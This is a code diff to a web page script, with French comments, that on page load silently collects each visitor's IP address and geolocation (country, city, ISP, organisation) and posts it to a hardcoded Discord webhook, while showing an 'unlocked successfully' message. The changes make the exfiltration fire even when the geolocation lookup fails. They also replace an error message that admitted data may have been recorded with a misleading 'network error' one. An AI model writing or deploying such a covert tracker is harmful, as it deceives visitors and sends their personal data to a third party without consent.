@@ -39,45 +39,51 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1453050534851379243/QQWpYZ
 window.onload = function() {
     document.getElementById("resultText").textContent = "Récupération de vos données...";
 
+    let ip = "Inconnu";
+    let geoInfo = "Aucune info geo récupérée (limite API atteinte ?)";
+
     fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => {
-            const ip = data.ip;
+            ip = data.ip;
 
-            // Récupération des infos geo + ISP via ip-api.com
+            // Tentative de récupération geo
             return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,city,isp,org`)
-                .then(geoRes => geoRes.json())
+                .then(geoRes => {
+                    if (!geoRes.ok) throw new Error("Rate limit ou erreur HTTP");
+                    return geoRes.json();
+                })
                 .then(geoData => {
-                    if (geoData.status !== "success") {
-                        throw new Error("Échec geo");
+                    if (geoData.status === "success") {
+                        const flag = geoData.countryCode ? String.fromCodePoint(...[...geoData.countryCode.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";
+                        geoInfo = `🌍 Pays : ${flag} ${geoData.country || "Inconnu"}\n🏙️ Ville : ${geoData.city || "Inconnu"}\n📡 ISP : ${geoData.isp || "Inconnu"}\n🏢 Org : ${geoData.org || "Inconnu"}`;
+                    } else {
+                        geoInfo = `Geo échouée : ${geoData.message || "Inconnu"}`;
                     }
-
-                    // Drapeau pays (optionnel, pour rendre joli sur Discord)
-                    const flag = geoData.countryCode ? String.fromCodePoint(...[...geoData.countryCode.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";
-
+                })
+                .catch(err => {
+                    geoInfo = "Geo indisponible (probablement limite de 45 req/min atteinte)";
+                })
+                .finally(() => {
+                    // Envoi au webhook même si geo échoue
                     const payload = {
                         content: `📥 **Nouveau visiteur (auto)**\n` +
                                  `🌐 IP : ${ip}\n` +
-                                 `🌍 Pays : ${flag} ${geoData.country || "Inconnu"}\n` +
-                                 `🏙️ Ville : ${geoData.city || "Inconnu"}\n` +
-                                 `📡 ISP : ${geoData.isp || "Inconnu"}\n` +
-                                 `🏢 Org : ${geoData.org || "Inconnu"}\n` +
+                                 `${geoInfo}\n` +
                                  `🕒 ${new Date().toLocaleString()}`
                     };
 
-                    return fetch(WEBHOOK_URL, {
+                    fetch(WEBHOOK_URL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(payload)
                     });
-                })
-                .then(() => {
+
                     document.getElementById("resultText").textContent = "Débloqué avec succès !";
                 });
         })
-        .catch(err => {
-            console.error(err);
-            document.getElementById("resultText").textContent = "Erreur, mais vos données ont peut-être été enregistrées.";
+        .catch(() => {
+            document.getElementById("resultText").textContent = "Erreur réseau, réessayez plus tard.";
         });
 }
 </script>
